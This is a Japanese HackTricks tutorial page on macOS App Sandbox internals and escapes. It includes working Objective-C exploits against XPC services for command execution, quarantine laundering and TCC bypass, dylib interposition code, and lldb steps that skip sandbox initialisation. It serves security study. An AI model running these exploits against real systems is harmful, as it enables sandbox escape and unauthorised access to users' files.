# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox の読み込みプロセス

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>画像の出典: <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

前の画像では、entitlement **`com.apple.security.app-sandbox`** を持つアプリケーションを実行したときに、**sandbox がどのように読み込まれるか**を確認できます。

コンパイラは、`/usr/lib/libSystem.B.dylib` をバイナリにリンクします。

次に、**`libSystem.B`** が複数の関数を呼び出し、最終的に **`xpc_pipe_routine`** がアプリケーションのentitlementを **`securityd`** に送信します。Securitydは、プロセスをsandbox内に隔離すべきかどうかを確認し、必要であれば隔離します。\
最後に、**`__sandbox_ms`** の呼び出しによってsandboxが有効になります。この関数は **`__mac_syscall`** を呼び出します。<sup>[[1]](#references)[[3]](#references)</sup>

## 考えられるバイパス

### quarantine属性のバイパス

**sandbox化されたプロセスが作成したファイル**には、sandbox escapeを防ぐために **quarantine属性**が付加されます。新しいアプリケーションを配置して起動しようとしても、quarantineフラグによって阻止されます。したがって、**quarantine属性なしでファイルやフォルダを配置できれば、App Sandboxをescapeできます**。`.app`バンドルを配置して`open`で起動するだけです。新たに起動されたプロセスは、自分のsandboxではなくLaunchServicesの下で実行されます。

**quarantineされていないファイルを確実に配置する方法**は、**別のプロセスにファイルを作成させること**です。Mickey Jinによる[**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)で説明されているように、**App Sandbox**は配置されたファイルにquarantineを設定しますが、Service Sandboxで動作する **XPCサービスは設定しません**。そのため、認証不要のXPCサービスを「quarantine laundering」の手段として利用できる場合があります。<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) および **CVE-2023-32414** (`ArchiveService`): sandbox化されたアプリから渡されたアーカイブを、展開した内容に **quarantine xattrを引き継がずに**、指定した場所へ展開します。
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): `submitSignpostDataWithConfig:` のパストラバーサルにより、**quarantineなしで任意のディレクトリを作成**できました。これだけで、コンテナ外に`.app`バンドルの構造全体を構築できます。
- **CVE-2024-27864** (`diskimagescontroller.xpc`): quarantineされたDMGを **マウント後のデバイスをquarantineせずに**マウントするため、マウントされたボリューム上のアプリを起動できます。

> [!TIP]
> 展開時には通常、**実行権限ビットが失われます**。CVE-2023-27944で使われた回避策は、バンドルのメイン実行ファイルとして、署名済みの既存システムバイナリ（例: `/System/Library/CoreServices/Automator Application Stub`）への **symlink** を配置することでした。これにより、配置したファイルに`+x`がなくても起動できます。

> [!CAUTION]
> この手法が機能するのは、チェックが**起動対象のアイテムに設定されたフラグ**に基づいて行われるためです。*「FinderまたはGUIからアプリやその他の実行可能コードを実行すると、macOSは読み込み前にquarantineフラグを確認する」*。その後に初めて、*「Gatekeeperに渡され、完全な『初回起動』セキュリティチェックが行われる」*（[Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)）。起動するバンドルにフラグがなければGatekeeperのチェックもありません。まさにこれが、上記のCVEで利用された手段です。<sup>[[5]](#references)</sup>
>
> なお、`.app`バンドルがすでに実行を許可されている（「実行を許可」のフラグが付いたquarantine xattrがある）場合、それを悪用することもできます。ただし、特権TCC権限がない限り **`.app`** バンドル内には書き込めません。sandbox内では、その権限は得られません。

### Open機能の悪用

[**Word sandbox bypassの最後の例**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)では、**`open`** CLI機能を悪用してsandboxをバイパスする方法を確認できます。


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

アプリケーションが **sandbox化される想定**（`com.apple.security.app-sandbox`）であっても、たとえば **LaunchAgent**（`~/Library/LaunchAgents`）から実行すれば、sandboxをバイパスできる場合があります。\
[**この投稿**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)で説明されているように、sandbox化されたアプリケーションで永続化したい場合は、LaunchAgentとして自動実行されるように設定し、DyLib環境変数を介して悪意のあるコードを注入できる可能性があります。<sup>[[6]](#references)</sup>

### 自動起動場所の悪用

sandbox化されたプロセスが、**後でsandbox化されていないアプリケーションがバイナリを実行する場所**に書き込めるなら、その場所にバイナリを配置するだけで **escapeできます**。この種の場所の例として、`~/Library/LaunchAgents`や`/System/Library/LaunchDaemons`があります。

これには、**より制限の緩いsandbox**（`file-read*`、`file-write*`）を持つプロセスにコードを実行させ、そのコードに、**sandbox化されずに実行される場所**へ実際に書き込ませるという **2段階の手順**が必要になることもあります。

**自動起動場所**については、こちらのページを確認してください:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### 他のプロセスの悪用

sandbox化されたプロセスから、より制限の緩いsandbox（またはsandboxなし）で動作する**他のプロセスを侵害**できれば、そのプロセスのsandboxへescapeできます:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### 利用可能なSystemおよびUser Machサービス

sandboxでは、プロファイル`application.sb`で定義された特定の **Machサービス**とXPC経由で通信することもできます。これらのサービスのいずれかを**悪用**できれば、**sandboxをescapeできる**可能性があります。

[このwriteup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)で説明されているように、Machサービスに関する情報は`/System/Library/xpc/launchd.plist`に保存されています。このファイル内で`<string>System</string>`と`<string>User</string>`を検索すると、すべてのSystemおよびUser Machサービスを見つけられます。<sup>[[4]](#references)</sup>

また、`bootstrap_look_up`を呼び出すことで、Machサービスがsandbox化されたアプリケーションから利用可能かどうかを確認できます:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### 利用可能な PID Mach services

これらの Mach services は、[この writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)で sandbox から脱出するために初めて悪用されました。当時、アプリケーションとその framework が必要とする**すべての XPC services**は、アプリの PID domain から見える状態でした（これらは `ServiceType` が `Application` の Mach Services です）。<sup>[[4]](#references)</sup>

**PID Domain XPC service に接続する**には、次のような行でアプリ内に登録するだけです。

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

さらに、`System/Library/xpc/launchd.plist` 内で `<string>Application</string>` を検索すると、すべての **Application** Mach サービスを見つけることができます。

有効な xpc サービスを見つける別の方法は、次の場所にあるものを確認することです：

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

この手法を悪用する例は[**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)にいくつか掲載されていますが、以下に概要を示します。<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

このサービスは常に`YES`を返すことで、すべてのXPC接続を許可します。また、メソッド`runTask:arguments:withReply:`は任意のパラメーターで任意のコマンドを実行します。

exploitは「次のように簡単でした」：

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

この XPC サービスは常に `YES` を返すため、すべてのクライアントを許可していました。また、`createZipAtPath:hourThreshold:withReply:` メソッドはフォルダーのパスを受け取り、そのフォルダーを ZIP ファイルに圧縮していました。

そのため、偽のアプリフォルダー構造を作成して圧縮し、その後解凍して実行すれば、サンドボックスを回避できます。新しいファイルには quarantine 属性が付与されないためです。

エクスプロイトは次のとおりです。

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

この XPC サービスは、任意の URL への読み取りおよび書き込みアクセスを、任意の接続を受け入れるメソッド `extendAccessToURL:completion:` を介して XPC クライアントに付与できます。この XPC サービスは FDA を持つため、これらの権限を悪用して TCC を完全にバイパスできます。

この exploit は次のとおりです。

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### 静的コンパイルと動的リンク

[**この研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)では、Sandboxを回避する2つの方法が発見されました。Sandboxは、**libSystem**ライブラリの読み込み時にユーザーランドから適用されます。そのため、バイナリがこのライブラリの読み込みを回避できれば、Sandboxの適用を受けません。<sup>[[2]](#references)</sup>

- バイナリが**完全に静的コンパイル**されていれば、このライブラリの読み込みを回避できます。
- バイナリが**ライブラリを一切読み込む必要がなければ**（リンカーもlibSystemに含まれているため）、libSystemを読み込む必要はありません。

### Shellcodes

**Shellcodeでさえ**、ARM64では`libSystem.dylib`にリンクする必要がある点に注意してください：

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### 継承されない制限

**[このwriteupのボーナス](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**で説明されているように、次のようなsandboxの制限があります。<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

たとえば、次のように新しいプロセスを実行することで回避できます:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

ただし、もちろん、この新しいプロセスは親プロセスのentitlementsやprivilegesを継承しません。

### spawn属性を使って継承したsandboxを置き換える（旧バージョンのmacOS）

通常の`posix_spawn()`の子プロセスは、親のsandboxを継承します。2026年2月の修正より前のmacOSビルドでは、sandbox化された親プロセスが`posix_spawnattr_setmacpolicyinfo_np()`を通じて、`Sandbox` MAC policyに**組み込みプロファイル名**を渡すことができました。その場合、子プロセスは親の制限の*代わりに*そのプロファイルを受け取ります。組み込みの`no-network`プロファイルでもユーザーのホームディレクトリにはアクセスできるため、`/bin/bash`などの子プロセスは、App Sandboxの親プロセスが操作できないファイルを操作できました。これは、別のサービスがプロセスを起動する[LaunchServicesの`open`経由](#not-inherited-restrictions)とは異なります。一般的な入力経路については、[MACFポリシー固有のspawn属性](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input)を参照してください。<sup>[[7]](#references)</sup>

**影響を受ける、隔離されたmacOSホスト**で境界をテストするには、アプリコンテナの外にあるホームディレクトリに無害なカナリアファイルを作成します。すでにsandbox化された親プロセスから同じ子プロセスを、まず通常の`posix_spawn()`で起動し、次に`no-network`を選択するSandbox spawn属性blobを使って起動して、子プロセスがカナリアファイルを読み取れるか比較します。以下のコード片では、Siguzaの[サンプルランチャー](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)にある非公開の`sandbox_spawnattr_t`定義と関数宣言を使用しています。テストアプリに組み込む際は、通常のエラー処理を追加してください。<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

`posix_spawn()` が成功しても、sandbox からの脱出が証明されたわけではありません。**子プロセスの実効ファイルアクセス**を通常の子プロセスのベースラインと比較してください。パッチ適用済みのシステムでは、すでに sandbox 内にいる呼び出し元が組み込みプロファイルを要求しても、非公開の `com.apple.private.security.sandbox-spawnattrs` entitlement がなければ拒否されます。この過去の挙動を、現在のバイパスとして扱わないでください。<sup>[[7]](#references)</sup>

### Entitlements

アプリケーションが特定の **entitlement** を持つ場合、以下のように、sandbox によって一部の**操作**が**許可される**ことがあります。

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

**Interposting**の詳細については、以下を確認してください:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` で sandbox を回避する

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Sandboxを回避するために`__mac_syscall`をinterposeする

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### lldbでSandboxをデバッグしてバイパスする

Sandbox化されるべきアプリケーションをコンパイルしましょう:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

次に、アプリをコンパイルします。:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> アプリはファイル **`~/Desktop/del.txt`** の**読み取り**を試みますが、**Sandbox によって許可されません**。\
> Sandbox をバイパスすると読み取れるようになるため、そこにファイルを作成してください:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

アプリケーションをデバッグして、Sandboxがいつロードされるか確認してみましょう：

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **Sandboxをバイパスしても、TCCはプロセスによるデスクトップ上のファイル読み取りを許可するかどうか、ユーザーに確認します**

## References

- [1] [Jonathan Levin - Apple Sandbox: さらに深く泥沼へ（HITB GSEC 2016 スライド）](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandboxからの脱出](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: さらに深く泥沼へ（HITB GSEC 2016）](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - macOS Sandbox脱出の新時代](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - 解説: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): DyLib Injectionを使用したTelegramによるmacOS TCCバイパス（パート2）](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [実行ファイルの起動によるApple Sandboxからの脱出](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza - 組み込みプロファイル向けのsandbox-exec](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
{{#include ../../../../../banners/hacktricks-training.md}}
